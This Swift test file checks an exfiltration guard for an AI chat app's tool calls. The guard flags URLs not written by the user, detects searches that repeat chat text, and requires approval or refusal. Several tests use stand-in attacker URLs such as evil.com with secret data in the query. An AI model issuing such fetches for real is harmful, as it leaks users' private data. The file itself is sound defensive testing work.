import SwiftData
import XCTest

@testable import AnyRouter

final class ExfiltrationGuardTests: XCTestCase {
    func testURLsAreFoundInEveryStringOfTheArguments() throws {
        let arguments = try XCTUnwrap(JSONValue.parse(
            ##"{"url":"https://a.com/x.","query":"see (https://b.org/p) now","list":["http://c.net/q?d=1;"],"n":3}"##))
        XCTAssertEqual(Set(ExfiltrationGuard.urls(in: arguments)), ["https://a.com/x", "https://b.org/p", "http://c.net/q?d=1"])
        XCTAssertEqual(ExfiltrationGuard.urls(in: .string("no links, only a.com")), [])
    }

    func testAURLIsSuppliedWhenItsHostIsInTheUsersWords() {
        let guardRules = ExfiltrationGuard(userTexts: ["Look at https://Example.com/page and also www.docs.rust-lang.org today."])
        XCTAssertTrue(guardRules.isSupplied("https://example.com/other?x=1"))
        XCTAssertTrue(guardRules.isSupplied("https://www.example.com/"))
        XCTAssertTrue(guardRules.isSupplied("https://docs.rust-lang.org/book"))
        XCTAssertFalse(guardRules.isSupplied("https://evil.com/?d=secret"))
        XCTAssertFalse(guardRules.isSupplied("https://example.com.evil.org/"))
        XCTAssertFalse(guardRules.isSupplied("https://sub.example.com/"))
        XCTAssertFalse(guardRules.isSupplied("https://notexample.com/"))
        XCTAssertFalse(guardRules.isSupplied("not a url"))
        XCTAssertFalse(ExfiltrationGuard(userTexts: ["notexample.com"]).isSupplied("https://example.com/"))
        XCTAssertFalse(ExfiltrationGuard(userTexts: []).isSupplied("https://example.com/"))
    }

    func testOnlyUnsuppliedURLsAreReportedOnce() throws {
        let guardRules = ExfiltrationGuard(userTexts: ["https://example.com/a"])
        let arguments = try XCTUnwrap(JSONValue.parse(
            ##"{"url":"https://example.com/b","other":["https://evil.com/1","https://evil.com/1","https://other.org"]}"##))
        XCTAssertEqual(Set(guardRules.unsuppliedURLs(in: arguments)), ["https://evil.com/1", "https://other.org"])
        XCTAssertEqual(guardRules.unsuppliedURLs(in: arguments).count, 2)
    }

    func testASearchRepeatingALongPassageOfTheChatIsFlagged() {
        let passage = "my account number is 12345 and the password for the portal is hunter2, please keep it secret from everyone"
        XCTAssertGreaterThan(passage.count, 80)
        let guardRules = ExfiltrationGuard(userTexts: ["Hello. " + passage + " Thanks!"])
        XCTAssertTrue(guardRules.repeatsUserText("find " + passage))
        XCTAssertTrue(guardRules.repeatsUserText(passage.uppercased().replacingOccurrences(of: " ", with: "   ")), "case and spacing do not hide it")
        // Under the limit, or only a few words, is an ordinary search.
        XCTAssertFalse(guardRules.repeatsUserText(String(passage.prefix(ExfiltrationGuard.verbatimLimit - 1))))
        XCTAssertFalse(guardRules.repeatsUserText("swift concurrency actors tutorial"))
        XCTAssertFalse(ExfiltrationGuard(userTexts: []).repeatsUserText(passage))
        XCTAssertTrue(guardRules.repeatsUserText(String(passage.prefix(ExfiltrationGuard.verbatimLimit))), "exactly the limit counts")
    }

    // MARK: Approval prompt

    func testThePromptShowsTheWholeAddressAndTheReason() {
        let long = "https://evil.com/" + String(repeating: "a", count: 600)
        let request = ToolApprovalRequest(
            serverName: "This device",
            spec: ToolSpec(name: "fetch_url", title: "Read a web page", description: "", schema: "{}", isReadOnly: true),
            call: ToolCall(id: "1", name: "fetch_url", argumentsJSON: #"{"url":"\#(long)"}"#),
            reason: "This address is not in your messages.", urls: [long])
        let message = ToolApprovalPrompt.message(for: request)
        XCTAssertEqual(message, "This device\nThis address is not in your messages.\n" + long)
        XCTAssertGreaterThan(message.count, ToolApprovalPrompt.maxArgumentCharacters)
    }

    func testAPlainRequestStillShowsCompactArguments() {
        let request = ToolApprovalRequest(
            serverName: "Srv",
            spec: ToolSpec(name: "t", title: nil, description: "", schema: "{}", isReadOnly: false),
            call: ToolCall(id: "1", name: "t", argumentsJSON: #"{ "b": 1, "a": 2 }"#))
        XCTAssertEqual(ToolApprovalPrompt.message(for: request), "Srv\n{\"a\":2,\"b\":1}")
    }
}

private final class RecordingApprover: ToolApproving, @unchecked Sendable {
    private let lock = NSLock()
    private var asked: [ToolApprovalRequest] = []
    private let decision: ToolDecision

    init(_ decision: ToolDecision) { self.decision = decision }
    var requests: [ToolApprovalRequest] { lock.withLock { asked } }

    func decide(_ request: ToolApprovalRequest) async -> ToolDecision {
        lock.withLock { asked.append(request) }
        return decision
    }
}

private final class Ran: @unchecked Sendable {
    private let lock = NSLock()
    private var count = 0
    func bump() { lock.withLock { count += 1 } }
    var value: Int { lock.withLock { count } }
}

/// A built-in that reports it ran, standing in for `fetch_url`.
private struct PageReader: BuiltInTool {
    let name = "fetch_url"
    let title = "Read a web page"
    let summary = ""
    let description = ""
    let schema: JSONSchema = "{}"
    let ran: Ran

    func run(_ arguments: JSONValue) async throws -> String {
        ran.bump()
        return "page"
    }
}

final class AgentToolHostExfiltrationTests: XCTestCase {
    private func host(
        said: [String], approver: (any ToolApproving)?, ran: Ran
    ) -> AgentToolHost {
        AgentToolHost(
            builtIns: [PageReader(ran: ran)], search: nil, mcp: nil,
            approver: approver, exfiltration: ExfiltrationGuard(userTexts: said))
    }

    private func fetch(_ url: String) -> ToolCall {
        ToolCall(id: "f", name: "fetch_url", argumentsJSON: #"{"url":"\#(url)"}"#)
    }

    func testALinkTheUserWroteRunsWithoutAsking() async {
        let ran = Ran()
        let approver = RecordingApprover(.deny)
        let result = await host(said: ["read https://example.com/a"], approver: approver, ran: ran).execute(fetch("https://example.com/b"))
        XCTAssertFalse(result.isError)
        XCTAssertEqual(ran.value, 1)
        XCTAssertTrue(approver.requests.isEmpty)
    }

    func testALinkFromElsewhereAsksWithTheFullAddressAndDenyStopsIt() async {
        let ran = Ran()
        let approver = RecordingApprover(.deny)
        let url = "https://evil.com/collect?d=" + String(repeating: "x", count: 400)
        let result = await host(said: ["hello"], approver: approver, ran: ran).execute(fetch(url))
        XCTAssertTrue(result.isError)
        XCTAssertEqual(result.text, "The user did not allow this tool call.")
        XCTAssertEqual(ran.value, 0)
        let request = try? XCTUnwrap(approver.requests.first)
        XCTAssertEqual(request?.urls, [url])
        XCTAssertEqual(request?.reason, "This address is not in your messages.")
        XCTAssertEqual(request?.serverName, "This device")
    }

    func testAllowOnceRunsAndAlwaysAllowIsNeverRemembered() async {
        let ran = Ran()
        let approver = RecordingApprover(.alwaysAllow)
        let host = host(said: [], approver: approver, ran: ran)
        _ = await host.execute(fetch("https://other.org/1"))
        _ = await host.execute(fetch("https://other.org/2"))
        XCTAssertEqual(ran.value, 2)
        XCTAssertEqual(approver.requests.count, 2, "each unwritten address asks again")
    }

    func testWithoutAnApproverTheCallIsRefused() async {
        let ran = Ran()
        let result = await host(said: [], approver: nil, ran: ran).execute(fetch("https://other.org/1"))
        XCTAssertTrue(result.isError)
        XCTAssertEqual(ran.value, 0)
    }

    func testAnAddressHiddenInAnotherArgumentIsCaughtToo() async {
        let ran = Ran()
        let approver = RecordingApprover(.deny)
        let call = ToolCall(id: "x", name: "fetch_url", argumentsJSON: ##"{"url":"https://example.com/","note":"also https://evil.com/?d=1"}"##)
        _ = await host(said: ["https://example.com"], approver: approver, ran: ran).execute(call)
        XCTAssertEqual(approver.requests.first?.urls, ["https://evil.com/?d=1"])
    }

    func testCallsWithoutAddressesNeverAsk() async {
        let ran = Ran()
        let approver = RecordingApprover(.deny)
        let result = await host(said: [], approver: approver, ran: ran)
            .execute(ToolCall(id: "n", name: "fetch_url", argumentsJSON: "{}"))
        XCTAssertFalse(result.isError)
        XCTAssertTrue(approver.requests.isEmpty)
    }
}

@MainActor
final class ToolContextTests: XCTestCase {
    func testOnlyTheUsersWordsAndFilesCountAsTrusted() throws {
        let context = ModelContext(try ModelContainer.anyRouter(inMemory: true))
        let thread = ThreadRecord(title: "t")
        context.insert(thread)
        func add(_ role: ChatMessage.Role, _ text: String, files: [ChatAttachment] = []) {
            let record = MessageRecord(role: role, content: text)
            context.insert(record)
            record.thread = thread
            record.attachments = files
        }
        let file = ChatAttachment(
            id: UUID(), kind: .text, filename: "n.txt", utType: "public.plain-text", byteCount: 3,
            relativePath: "t/n.txt", extractedText: "see https://docs.example.org")
        add(.user, "read https://example.com", files: [file])
        add(.assistant, "I found https://evil.com")
        add(.user, "thanks")

        let built = ChatViewModel.toolContext(for: thread)
        XCTAssertEqual(Set(built.userTexts), ["read https://example.com", "see https://docs.example.org", "thanks"])
        XCTAssertEqual(built.attachments.map(\.filename), ["n.txt"])
    }
}
